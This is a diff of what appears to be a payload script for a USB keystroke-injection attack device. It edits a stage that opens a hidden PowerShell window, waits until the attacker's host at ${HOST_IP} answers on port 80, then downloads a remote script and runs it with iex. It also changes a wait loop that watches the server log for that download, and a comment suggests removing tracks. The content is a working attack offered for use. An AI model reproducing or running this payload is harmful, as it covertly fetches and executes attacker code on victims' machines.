@@ -45,12 +45,12 @@ cp -R ${PAYLOAD_DIR}/* /tmp/ # any additional assets will be available in tmp
 # STAGE 1 - POWERSHELL
 LED STAGE1
 
-RUN WIN "powershell -WindowStyle Hidden \"\$web=New-Object Net.WebClient;while (\$TRUE) {If ((New-Object net.sockets.tcpclient ('${HOST_IP}','80')).Connected) {iex \$web.DownloadString('http://${HOST_IP}/p.txt');\$web.DownloadString('http://172.16.64.1/DONE');exit}}\""
+RUN WIN "powershell -WindowStyle Hidden \"\$web = New-Object Net.WebClient;While (\$true) {If ((New-Object net.sockets.tcpclient ('${HOST_IP}','80')).Connected) {iex \$web.DownloadString('http://${HOST_IP}/p.txt');exit}}\""
 # Remove tracks in the psh payload if you wish
 
 # STAGE 2 - WAIT
 LED STAGE2
-while ! grep -Fq "GET \"/DONE\"" ${SERVER_LOG}; do
+while ! grep -Fq "GET \"/p.txt\"" ${SERVER_LOG}; do
     sleep .5
 done
 
